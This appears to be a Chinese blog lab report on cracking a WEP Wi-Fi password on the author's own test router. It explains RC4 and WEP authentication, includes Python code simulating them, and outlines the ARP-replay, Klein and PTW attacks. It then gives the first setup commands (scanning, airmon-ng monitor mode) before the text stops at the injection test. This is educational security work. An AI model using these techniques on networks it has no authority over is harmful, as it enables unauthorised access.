<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.0.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"qilianshuo.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="WEP Wi-Fi口令攻击实验实验目的 了解WEP认证协议流程和其安全缺陷。 掌握协议攻击原理和流密码的应用。  实验环境配置AP配置">
<meta property="og:type" content="article">
<meta property="og:title" content="WEP口令实验">
<meta property="og:url" content="https://qilianshuo.github.io/2022/04/25/WEP%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C/index.html">
<meta property="og:site_name" content="Mirage&#39;s Blog">
<meta property="og:description" content="WEP Wi-Fi口令攻击实验实验目的 了解WEP认证协议流程和其安全缺陷。 掌握协议攻击原理和流密码的应用。  实验环境配置AP配置">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://picgo-mirage.oss-cn-hangzhou.aliyuncs.com/image/image-20220425092421608.png">
<meta property="og:image" content="https://picgo-mirage.oss-cn-hangzhou.aliyuncs.com/image/%E6%88%AA%E5%B1%8F2022-04-20%20%E4%B8%8B%E5%8D%888.27.26.png">
<meta property="og:image" content="https://picgo-mirage.oss-cn-hangzhou.aliyuncs.com/image/image-20220423222229656.png">
<meta property="og:image" content="https://picgo-mirage.oss-cn-hangzhou.aliyuncs.com/image/WEPEncrypt.drawio.svg">
<meta property="og:image" content="https://picgo-mirage.oss-cn-hangzhou.aliyuncs.com/image/image-20220422200002182.png">
<meta property="article:published_time" content="2022-04-25T10:35:22.000Z">
<meta property="article:modified_time" content="2022-04-25T10:47:52.593Z">
<meta property="article:author" content="Mirage">
<meta property="article:tag" content="密码">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://picgo-mirage.oss-cn-hangzhou.aliyuncs.com/image/image-20220425092421608.png">

<link rel="canonical" href="https://qilianshuo.github.io/2022/04/25/WEP%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>WEP口令实验 | Mirage's Blog</title>
  


  <script>
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?a046ffda7fbc3077469517d577c849db";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>




  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<link rel="alternate" href="/atom.xml" title="Mirage's Blog" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Mirage's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">随心记录～</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://qilianshuo.github.io/2022/04/25/WEP%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Mirage">
      <meta itemprop="description" content="越过山丘，才发现无人等候">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Mirage's Blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          WEP口令实验
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-04-25 18:35:22 / 修改时间：18:47:52" itemprop="dateCreated datePublished" datetime="2022-04-25T18:35:22+08:00">2022-04-25</time>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>10k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>9 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="WEP-Wi-Fi口令攻击实验"><a href="#WEP-Wi-Fi口令攻击实验" class="headerlink" title="WEP Wi-Fi口令攻击实验"></a>WEP Wi-Fi口令攻击实验</h1><h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><ul>
<li>了解WEP认证协议流程和其安全缺陷。</li>
<li>掌握协议攻击原理和流密码的应用。</li>
</ul>
<h2 id="实验环境配置"><a href="#实验环境配置" class="headerlink" title="实验环境配置"></a>实验环境配置</h2><h3 id="AP配置"><a href="#AP配置" class="headerlink" title="AP配置"></a>AP配置</h3><p>&emsp;&emsp;PHICOMM裴讯K2路由器，刷机华硕固件。AP加密模式为WEP- Open System，口令设置为<code>WEPAttackTest</code>。</p>
<p><img src="https://picgo-mirage.oss-cn-hangzhou.aliyuncs.com/image/image-20220425092421608.png" alt="image-20220425092421608"></p>
<h3 id="攻击环境"><a href="#攻击环境" class="headerlink" title="攻击环境"></a>攻击环境</h3><p>&emsp;&emsp;macOS Monterey主机 + Kali虚拟机 + USB外置网卡。</p>
<p><img src="https://picgo-mirage.oss-cn-hangzhou.aliyuncs.com/image/%E6%88%AA%E5%B1%8F2022-04-20%20%E4%B8%8B%E5%8D%888.27.26.png" alt="截屏2022-04-20 下午8.27.26"></p>
<p><img src="https://picgo-mirage.oss-cn-hangzhou.aliyuncs.com/image/image-20220423222229656.png" alt="image-20220423222229656"></p>
<h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><ol>
<li>通过arp欺骗获取口令（俗称密码）</li>
<li>编程实现WEP认证协议</li>
<li>解析口令获取的原理和过程</li>
<li>分析WAP认证协议如何抵抗该攻击方法</li>
</ol>
<h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><blockquote>
<p>WEP协议的安全性依赖于RC4加密算法的安全性，同时IEEE802.11协议的一些安全问题使攻击更容易完成。</p>
</blockquote>
<h3 id="RC4加密分析"><a href="#RC4加密分析" class="headerlink" title="RC4加密分析"></a>RC4加密分析</h3><p>&emsp;&emsp;RC4的本质是流密码的异或加密，为了获取与明文等长的密钥流，使用了两个算法：<code>Key Scheduling Algorithm(RC4-KSA)</code>和<code>Pseudo Random Generator Algorithm(PRGA)</code>。</p>
<p>&emsp;&emsp;RC4使用一个长度为256的字节数组S，每次从中随机选择一位作为密钥流的一部分。可以看出密钥流的生成本质是随机数的生成，使用密钥作为初始种子，通过算法去不断迭代生成随机密钥流。</p>
<p>&emsp;&emsp;密钥调度算法KSA的处理过程如下：</p>
<script type="math/tex; mode=display">
\begin{aligned}
&for \quad i  = 0 \quad to \quad{n-1} \quad do\\
&\quad S[i] = i\\
&end\\
&for \quad i = 0 \quad to \quad{n-1} \quad do\\
&\quad j = RND(n)\\
&\quad swap(S,i,j)\\
&end\\
\end{aligned}</script><p>&emsp;&emsp;伪随机数生成算法PRGA的处理过程如下：</p>
<script type="math/tex; mode=display">
\begin{aligned}
&i=0\\
&j=0\\
&loop\\
&\quad i = i + 1 \mod n\\
&\quad j = RND(n)\\
&\quad swap(S,i,j)\\
&\quad print \ S[S[i]+S[j] \mod n]\\
&end \ loop\\
\end{aligned}</script><p>&emsp;&emsp;PRGA可以是一个无限长的循环，循环次数取决于需要加密的数据长度，每循环一次生成一位密钥字节，最终得到与明文等长的密钥流，与明文逐个字节进行异或处理，就得到了密文。</p>
<h3 id="WEP认证分析"><a href="#WEP认证分析" class="headerlink" title="WEP认证分析"></a>WEP认证分析</h3><p>&emsp;&emsp;为了使密钥具有随机性，WEP引入了初始向量initialization vector（IV），把IV添加到密钥头生成新的密钥，这样每次用来生成密钥流的随机种子都会不同，以增强协议的安全性。<br><img src="https://picgo-mirage.oss-cn-hangzhou.aliyuncs.com/image/WEPEncrypt.drawio.svg" alt="image-20220423233311891"></p>
<ol>
<li>STA向AP发送Authentication Request认证请求。</li>
<li>AP生成一个随机字符串(challenge)，明文发送给STA。</li>
<li>STA使用密钥加密<code>challenge</code>，把密文发给AP。</li>
<li>AP使用正确密钥解密STA发来的密文，如果解密后的数据和<code>challenge</code>相同，返回认证成功响应，否则返回失败响应。</li>
</ol>
<h4 id="编程模拟WEP认证过程"><a href="#编程模拟WEP认证过程" class="headerlink" title="编程模拟WEP认证过程"></a>编程模拟WEP认证过程</h4><blockquote>
<p>使用<code>scapy</code>库可以完成网卡发包，完全仿真WEP认证过程。由于没有充足的时间，暂时使用socket实现STA和AP间通信。</p>
</blockquote>
<ul>
<li><code>RC4.py</code> — 完成RC4加密及解密</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RC4</span>:</span></span><br><span class="line">    n = <span class="number">256</span></span><br><span class="line">    __S = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">    __T = []</span><br><span class="line">    __K = <span class="built_in">list</span>()</span><br><span class="line">    l = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, key: <span class="built_in">str</span></span>):</span></span><br><span class="line">        self.__K = key.encode()</span><br><span class="line">        self.l = <span class="built_in">len</span>(self.__K)</span><br><span class="line"></span><br><span class="line">        self._KSA()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_KSA</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.n):</span><br><span class="line">            j = (j + self.__S[i] + self.__K[i % self.l]) % self.n</span><br><span class="line">            self.__S[i], self.__S[j] = self.__S[j], self.__S[i]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">PRGA</span>(<span class="params">self, length</span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        key_stream = []</span><br><span class="line">        self.__T = self.__S.copy()</span><br><span class="line">        <span class="keyword">while</span> length:</span><br><span class="line">            i = (i + <span class="number">1</span>) % self.n</span><br><span class="line">            j = (j + self.__T[i]) % self.n</span><br><span class="line">            self.__T[i], self.__T[j] = self.__T[j], self.__T[i]</span><br><span class="line">            k = (self.__T[i] + self.__T[j]) % self.n</span><br><span class="line">            key_stream.append(self.__T[k])</span><br><span class="line">            length -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> key_stream</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">self, plaintext</span>) -&gt; <span class="built_in">str</span>:</span></span><br><span class="line">        key_stream = self.PRGA(<span class="built_in">len</span>(plaintext))</span><br><span class="line">        plain_stream = plaintext.encode()</span><br><span class="line">        cipher = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plaintext)):</span><br><span class="line">            cipher += <span class="built_in">hex</span>(plain_stream[i] ^ key_stream[i]).upper()[<span class="number">2</span>:].rjust(<span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">self, ciphertext: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span></span><br><span class="line">        cipher_byte = [<span class="built_in">int</span>(ciphertext[i:i + <span class="number">2</span>], <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ciphertext), <span class="number">2</span>)]</span><br><span class="line">        key_stream = self.PRGA(<span class="built_in">len</span>(cipher_byte))</span><br><span class="line">        plain = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher_byte)):</span><br><span class="line">            plain += <span class="built_in">chr</span>(cipher_byte[i] ^ key_stream[i])</span><br><span class="line">        <span class="keyword">return</span> plain</span><br></pre></td></tr></table></figure>
<ul>
<li><code>STA.py</code> — 模拟认证终端</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> RC4 <span class="keyword">import</span> RC4</span><br><span class="line"></span><br><span class="line">client = socket.socket()</span><br><span class="line">client.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">6968</span>))</span><br><span class="line">rc4 = RC4(<span class="string">&#x27;Mirage&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 发起认证请求</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;1. Send AuthenticationRequest&#x27;</span>)</span><br><span class="line">data = <span class="string">&quot;AuthenticationRequest&quot;</span></span><br><span class="line">client.send(<span class="built_in">bytes</span>(data, encoding=<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">data = client.recv(<span class="number">1024</span>)</span><br><span class="line">data = data.decode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 发送加密后的字符串</span></span><br><span class="line"><span class="keyword">if</span> data.startswith(<span class="string">&#x27;AuthenticationChallenge&#x27;</span>):</span><br><span class="line">    challenge = data[<span class="number">23</span>:]</span><br><span class="line">    cipher = rc4.encrypt(challenge)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;2. Use RC4 to encrypt the challenge:&#x27;</span>, challenge)</span><br><span class="line">    client.send(cipher.encode())</span><br><span class="line">    data = client.recv(<span class="number">1024</span>)</span><br><span class="line">    data = data.decode()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;3.&#x27;</span>, data)</span><br></pre></td></tr></table></figure>
<ul>
<li><code>AP.py</code> — 模拟AP路由</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> RC4 <span class="keyword">import</span> RC4</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_generator</span>(<span class="params">length: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(random.sample(</span><br><span class="line">        [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>], length</span><br><span class="line">    ))</span><br><span class="line"></span><br><span class="line">rc4 = RC4(<span class="string">&#x27;Mirage&#x27;</span>)</span><br><span class="line"></span><br><span class="line">server = socket.socket()</span><br><span class="line">server.bind((<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6968</span>))</span><br><span class="line">server.listen()</span><br><span class="line"></span><br><span class="line">tmp = <span class="built_in">dict</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    con, addr = server.accept()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = con.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        data = data.decode()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> data == <span class="string">&#x27;AuthenticationRequest&#x27;</span>:</span><br><span class="line">            challenge = random_generator(<span class="number">20</span>)</span><br><span class="line">            tmp[addr[<span class="number">0</span>]] = challenge</span><br><span class="line">            <span class="built_in">print</span>(addr[<span class="number">0</span>], challenge)</span><br><span class="line">            con.send((<span class="string">&#x27;AuthenticationChallenge&#x27;</span> + challenge).encode())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(rc4.decrypt(data))</span><br><span class="line">            <span class="built_in">print</span>(tmp.get(addr[<span class="number">0</span>]))</span><br><span class="line">            <span class="keyword">if</span> rc4.decrypt(data) == tmp.get(addr[<span class="number">0</span>]):</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">str</span>(addr), <span class="string">&#x27;AuthenticationResponseSuccess&#x27;</span>)</span><br><span class="line">                con.send(<span class="string">&#x27;AuthenticationResponseSuccess&#x27;</span>.encode())</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">str</span>(addr), <span class="string">&#x27;AuthenticationResponseFail&#x27;</span>)</span><br><span class="line">                con.send(<span class="string">&#x27;AuthenticationResponseFail&#x27;</span>.encode())</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="与RC4无关的攻击"><a href="#与RC4无关的攻击" class="headerlink" title="与RC4无关的攻击"></a>与RC4无关的攻击</h3><ul>
<li><p>认证攻击</p>
<p>攻击者通过捕获STA和AP之间交换的认证数据包，构造新的合法认证。<code>aireplay-ng</code>工具实现了该攻击，<code>-1</code>为该攻击模式。</p>
</li>
<li><p>数据包注入攻击</p>
<p>攻击者捕获WEP网络的数据包，一段时间后重放，分为普通注入和ARP注入。本次实验使用到大量ARP包，<code>aireplay-ng</code>工具的<code>-3</code>模式为ARP重放注入攻击。由于WEP协议没有重复IV过滤机制，导致只要抓到一个ARP请求，攻击者就可以大量复制该请求包并重放来抓取AP的ARP响应。</p>
</li>
</ul>
<h3 id="与RC4有关的攻击"><a href="#与RC4有关的攻击" class="headerlink" title="与RC4有关的攻击"></a>与RC4有关的攻击</h3><ul>
<li><p>FMS攻击、KoreK攻击</p>
<p>需要较多的计算资源，并未对WEP协议造成致命打击，不在此详细介绍。</p>
</li>
<li><p>Klein攻击</p>
<p>该攻击利用Jenkis关联，可以证明：$Prob(K[l] = S_l^{-1}(l - X[l-1] - j_l - S_l[l]) = q(2/n) + (1-q)((n-2)/n(n-1))$大约为$1.3676/n$，其中，$q=(1-1/n)^{n-2}$。</p>
<p>攻击形式为：</p>
<script type="math/tex; mode=display">
F_{Klein}(K[0],K[1],\cdots,K[l-1],X[l-1]) = S_l^{-1}[l-X[l-1]] - j_l - S_l[l]</script></li>
<li><p>PTW攻击</p>
<p>PTW攻是WEP安全性的分水岭，在此之前的攻击要么因为需要大量数据包要么需要大量计算而具有较高的攻击门槛，而PTW攻击只需要使用几千到几万个ARP包并用少量的计算就能攻破密码。</p>
<p>该攻击的主要思想为由决定密钥单个字节改变决定$\sigma_i = \sum\limits_{m=0}^iRk[m]$。</p>
<ol>
<li><p>将Klein攻击扩展为2个密钥Byte的和。可以证明：$Prob(K[l]+K[l+1]=S_l^{-1}(l+1-X[l])-j_l-S_l[l]-S_l[l+1])$为$q_2((n-1)/n)^{n-2}(2/n)+(1-q_2((n-1)/n)^{n-2})((n-2)/n(n-1))$。其中，$q_2$为$((n-1)/n)^3$。</p>
<p>PTW2攻击形式为：</p>
<script type="math/tex; mode=display">
F_{PTW2}(K[0],K[1],\cdots,K[l-1],X[l]) = S_l^{-1}[l+1-X[l]] - j_l - S_l[l] - S_l[l+1]</script></li>
<li><p>继续扩展为m个密钥Byte的和。可以证明：</p>
<script type="math/tex; mode=display">
Prob(\sum_{a=l}^{l+m-1}K[a] = S_l^{-1}(l+m+1-X[l+m-2])-j_l-\sum_{a=l}^{l+m-1}S_l[a])</script><p>为$q_m((n-1)/n)^{n-2}(2/n)+(1-q_m((n-1)/n)^{n-2})((n-2)/n(n-1))$。其中，$q_m$为$(\frac {n-1}{n})^{m-1}(\frac{n-m+1}{n})\mathop{\Pi}\limits_{a=1}^{m-1}(\frac{n-a}{n})$。</p>
<p>PTW攻击形式为：</p>
<script type="math/tex; mode=display">
F_{PTWm}(K[0],K[1],\cdots,K[l-1],X[l+m-2]) = S_l^{-1}[l+m-1-X[l+m-2]] - j_l - \sum\limits_{a=l}^{l+m-1}S_l[a]</script></li>
</ol>
</li>
</ul>
<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="确认目标"><a href="#确认目标" class="headerlink" title="确认目标"></a>确认目标</h3><ol>
<li><p>在MacOS上使用<code>airport</code>工具扫描附近AP，确认攻击目标所在信道。扫描命令为：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airport -s</span><br></pre></td></tr></table></figure>
<p><img src="https://picgo-mirage.oss-cn-hangzhou.aliyuncs.com/image/image-20220422200002182.png" alt="image-20220422200002182"></p>
<blockquote>
<p>或在Kali中使用<code>airodump-ng</code>工具扫描，确认目标信道及MAC后再锁定网卡信道。</p>
</blockquote>
</li>
<li><p>在kali虚拟机中将网卡开启监听模式，同时锁定目标信道。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start wlan0 13</span><br></pre></td></tr></table></figure>
<p>使用<code>iwconfig</code>命令确认网卡是否开启monitor模式。</p>
</li>
<li><p>测试注入可行性</p>
<blockquote>
